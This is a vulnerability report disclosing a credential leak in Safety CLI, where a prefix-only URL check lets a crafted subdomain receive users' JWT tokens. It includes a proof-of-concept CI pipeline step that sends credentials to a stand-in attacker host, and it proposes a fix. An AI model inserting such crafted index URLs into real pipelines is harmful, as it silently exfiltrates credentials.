# Security Vulnerability Report — Safety CLI

## Summary

Safety CLI contains a credential leak vulnerability in `AuditableUvCommand`. The `--index-url` argument is validated using `startswith("https://pkgs.safetycli.com")` before injecting user credentials into the URL. This check does not enforce a domain boundary and is trivially bypassed via subdomain crafting.

When a Safety Firewall user runs a `uv install` command with a crafted `--index-url`, the Safety CLI embeds their JWT access token into the URL and passes it to `uv`, which transmits it as an `Authorization: Basic` header to the attacker-controlled server.

**One-line summary:** `startswith()` check on `--index-url` is bypassable via subdomain, causing the JWT credential to be transmitted to an attacker-controlled server.

---

## Details

### Vulnerable Code — `safety/tool/uv/command.py`, `before()` method, L72–73

```python
# Validation uses string prefix check — does not enforce domain boundary
if index_value and index_value.startswith("https://pkgs.safetycli.com"):
    self.__index_url = index_value
```

The URL `https://pkgs.safetycli.com.attacker.com` passes this check because it starts with the expected string, despite resolving to a completely different domain.

### Credential Injection — `safety/tool/auth.py`, `build_index_url()`

```python
# Credential embedded unconditionally into URL netloc
url = urlsplit(index_url)
encoded_auth = index_credentials(ctx)   # real JWT access token
netloc = f"user:{encoded_auth}@{url.netloc}"
return urlunsplit(url._replace(netloc=netloc))
```

`index_credentials()` returns a base64-encoded JSON envelope containing the active JWT access token, API key, or machine token from the authenticated Safety CLI session. When the bypassed URL is stored in `self.__index_url`, `build_index_url()` embeds this credential into the attacker URL without any secondary domain validation.

**Result:**

```
UV_DEFAULT_INDEX = https://user:<JWT_TOKEN>@pkgs.safetycli.com.attacker.com/simple
```

`uv` then transmits the credential in the `Authorization` header on every package resolution request.

### Affected Scope

| Field | Value |
|---|---|
| Affected users | Safety Firewall users (`firewall_enabled = True`) |
| Credential leaked | JWT `access_token` — grants authenticated access to Safety Platform |
| Token storage | `~/.config/safety/auth.ini` (plaintext) |
| Token validity | ~24 hours (OAuth2 access token) |
| Attack vector | Social engineering or CI/CD pipeline argument injection |

---

## PoC

Attacker-modified CI/CD pipeline (e.g. `.github/workflows/install.yml`):

```yaml
- run: safety uv pip install -r requirements.txt \
         --index-url https://pkgs.safetycli.com.attacker.com/simple
```

Every CI run silently transmits the service account's Safety JWT to the attacker's server. The pipeline continues to function normally — `uv` retries against the default index after the attacker server returns an error — making the leak difficult to detect without network monitoring.

Attacker server receives:

```
Authorization: Basic dXNlcjpleUp2WlhKemFXOXVJam9nSWpFdU1DSXNJaUpo...
```

Decoded:

```json
{"version": "1.0", "access_token": "<JWT>", "api_key": null, "project_id": "..."}
```

---

## Impact

An attacker who can influence the `--index-url` argument — via CI/CD pipeline modification, supply-chain compromise, or social engineering — can silently harvest live JWT tokens from any Safety Firewall-enabled environment. Captured tokens grant full authenticated access to the Safety Platform for up to 24 hours and can be used to exfiltrate dependency scan results or impersonate service accounts.

---

## Suggested Remediation

Replace the `startswith()` check with explicit host validation using `urlsplit`:

```python
from urllib.parse import urlsplit

parsed = urlsplit(index_value)
if (
    parsed.scheme == "https"
    and parsed.hostname == "pkgs.safetycli.com"
    and not parsed.username  # block userinfo injection
):
    self.__index_url = index_value
```

This ensures only the exact host `pkgs.safetycli.com` is accepted, rejecting both subdomain variants (`pkgs.safetycli.com.evil.com`) and userinfo injection (`pkgs.safetycli.com@evil.com`).

---

## Credit

- VulnHunterX — Bug Verification Framework
- Huy - VinSOC Redteam
- Trieu Dai / Cat Tuong / Tien Thinh - Security Researcher

---

*We are available to discuss remediation, provide further technical details, or assist with patch verification at your convenience.*

**Best regards,**
Tien Thinh